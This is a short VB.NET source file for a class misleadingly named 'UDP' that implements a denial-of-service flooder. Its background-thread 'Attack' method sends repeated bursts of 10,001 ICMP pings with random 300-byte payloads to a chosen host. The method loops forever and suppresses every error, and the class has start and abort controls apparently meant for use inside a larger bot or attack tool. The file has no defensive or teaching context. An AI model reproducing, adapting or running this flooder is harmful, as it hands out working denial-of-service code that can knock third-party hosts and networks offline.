﻿Public Class UDP
    Public Host As String
    Dim attacker As New Threading.Thread(AddressOf Attack)
    Public Sub Start()
        Try
            attacker.IsBackground = True
            attacker.Start(Host)
        Catch ex As Exception

        End Try

    End Sub
    Public Sub Abort()
        attacker.Abort()
    End Sub
    Public Sub Attack(Host As String)
        On Error Resume Next
        Dim st As Integer = +1
        If st <> 2 Then
Attck:
            System.Threading.Thread.Sleep(1500)
            Dim aa As New System.Net.NetworkInformation.Ping
            Dim bb As System.Net.NetworkInformation.PingReply
            Dim txtlog As String = ""
            Dim cC As New System.Net.NetworkInformation.PingOptions
            cC.DontFragment = True
            cC.Ttl = 64
            Dim data As String = Randomisi2(300)
            Dim bt As Byte() = System.Text.Encoding.ASCII.GetBytes(data)
            Dim i As Int16
            For i = 0 To 10000
                bb = aa.Send(Host, 2000, bt, cC)
            Next i
            Resume Attck
        End If
    End Sub
    Public Function Randomisi2(ByVal lenght As Integer) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = "•¥µ☺☻♥♦♣♠•◘○◙♀♪♫☼►◄↕‼¶§▬↨↑↓→←∟↔▲▼1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهوي~!@#$%^&*()+-/><".ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function
End Class